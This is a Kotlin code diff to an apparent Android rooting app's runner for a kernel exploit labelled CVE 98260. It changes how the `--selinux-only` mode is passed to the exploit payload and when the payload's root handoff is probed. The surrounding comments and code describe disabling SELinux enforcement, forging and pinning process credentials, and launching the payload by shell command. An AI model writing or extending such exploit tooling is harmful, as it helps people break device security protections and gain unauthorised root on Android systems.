@@ -127,10 +127,12 @@ object Cve98260Runner {
      *        lets the payload calibrate it itself
      * @param selinuxOnly stop right after `selinux_enforcing` is cleared: no cred rewrite, no
      *        bootstrap, no handoff probe. The payload prints `C98260_SELINUX_ONLY_DONE=1`
-     *        (plus `C98260_SELINUX_UNVERIFIED=1` when the enforce readback was skipped)
+     *        (plus `C98260_SELINUX_UNVERIFIED=1` when the enforce readback was skipped). Passing
+     *        `--selinux-only` inside [extraArgs] has the same effect and is what the options sheet
+     *        does now.
      * @param extraArgs arguments from the 98260 options sheet, already in payload order. Only the
      *        switches this app does not own arrive here: `--slide`, `--profile`, `--color` and
-     *        `--no-ksu` are built above, and `--selinux-only` has its own flag.
+     *        `--no-ksu` are built above.
      */
     @Throws(Exception::class)
     fun run(
@@ -229,7 +231,12 @@ object Cve98260Runner {
             ""
         }
         val slideArg = slide?.let { " --slide 0x" + java.lang.Long.toHexString(it) }.orEmpty()
-        val modeArg = if (selinuxOnly) " --selinux-only" else ""
+        // `--selinux-only` arrives two ways: the dedicated flag, or the options sheet (which now
+        // owns every argument, mode chips included). Collapse them so the switch is never emitted
+        // twice, and so the verdict below works whichever route the caller took.
+        val stopAfterSelinux = selinuxOnly || extraArgs.contains("--selinux-only")
+        val modeArg =
+            if (selinuxOnly && !extraArgs.contains("--selinux-only")) " --selinux-only" else ""
         val extraArg = if (extraArgs.isEmpty()) "" else
             " " + extraArgs.joinToString(" ") { shellQuote(it) }
         // A successful full run leaves the parent waiting for the child that pins the forged cred
@@ -237,7 +244,7 @@ object Cve98260Runner {
         // the stream until the watchdog fires, so the app asks for the documented handoff instead:
         // the child turns daemon and keeps the page, the parent returns and the log stays live.
         val lifecycleArg =
-            if (!selinuxOnly && !skipsHandoff(extraArgs)) " --daemon-exit" else ""
+            if (!stopAfterSelinux && !skipsHandoff(extraArgs)) " --daemon-exit" else ""
 
         onLine("$ cd $STAGE_DIR && OPENROOT_HANDOFF=$STAGE_DIR/$BOOTSTRAP_REMOTE " +
             "./$PAYLOAD --color=never --no-ksu$profileArg$slideArg$modeArg$extraArg$lifecycleArg")
@@ -276,7 +283,7 @@ object Cve98260Runner {
         )
         onProgress(0.92f)
 
-        if (selinuxOnly) {
+        if (stopAfterSelinux) {
             onProgress(1f)
             val detail = when {
                 selinuxUnverified -> "SELinux write executed, enforce not read back"
@@ -320,13 +327,14 @@ object Cve98260Runner {
     /**
      * True for the modes that end inside the payload.
      *
-     * `--lmap-only`, `--cred-only`, the address gate, the profile dump and every `--poke*` return
-     * before the cred rewrite. Probing for a handoff afterwards would stall on its timeout and then
-     * report "no root" for a run that never promised one.
+     * `--lmap-only`, `--cred-only`, `--selinux-only`, the address gate, the profile dump and every
+     * `--poke*` return before the cred rewrite. Probing for a handoff afterwards would stall on its
+     * timeout and then report "no root" for a run that never promised one.
      */
     private fun skipsHandoff(args: List<String>): Boolean = args.any {
-        it == "--lmap-only" || it == "--cred-only" || it == "--check-target" ||
-            it == "--dump-config" || it == "--test-log" || it.startsWith("--poke")
+        it == "--lmap-only" || it == "--cred-only" || it == "--selinux-only" ||
+            it == "--check-target" || it == "--dump-config" || it == "--test-log" ||
+            it.startsWith("--poke")
     }
 
     /**
